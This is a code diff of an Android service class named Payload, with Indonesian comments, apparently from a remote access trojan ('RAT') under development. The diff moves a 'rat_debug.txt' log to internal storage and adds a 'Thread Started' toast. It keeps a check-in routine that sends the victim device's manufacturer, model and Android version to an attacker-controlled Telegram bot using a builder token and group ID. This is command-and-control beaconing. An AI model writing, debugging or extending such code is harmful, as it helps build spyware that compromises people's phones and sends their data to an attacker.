@@ -46,7 +46,8 @@ public class Payload extends Service {
 
     private void writeLog(String msg) {
         try {
-            File file = new File(getExternalFilesDir(null), "rat_debug.txt");
+            // Pindah ke getFilesDir (Internal) biar ga di-lock sistem
+            File file = new File(getFilesDir(), "rat_debug.txt");
             FileOutputStream fos = new FileOutputStream(file, true);
             fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
             fos.close();
@@ -121,6 +122,15 @@ public class Payload extends Service {
         new Thread(new Runnable() {
             @Override
             public void run() {
+                try {
+                    android.os.Handler handler = new android.os.Handler(getMainLooper());
+                    handler.post(new Runnable() {
+                        public void run() {
+                            Toast.makeText(getApplicationContext(), "Thread Started", Toast.LENGTH_LONG).show();
+                        }
+                    });
+                } catch (Exception e) {}
+
                 writeLog("3. Thread jalan");
                 String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
                 
@@ -181,7 +191,6 @@ public class Payload extends Service {
     private void sendCheckIn(String deviceInfo) {
         try {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
-            // MENGGUNAKAN BUILDER_TOKEN & GROUP_ID
             String urlStr = "https://api.telegram.org/bot" + BUILDER_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
             new URL(urlStr).openConnection().getInputStream().close();
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
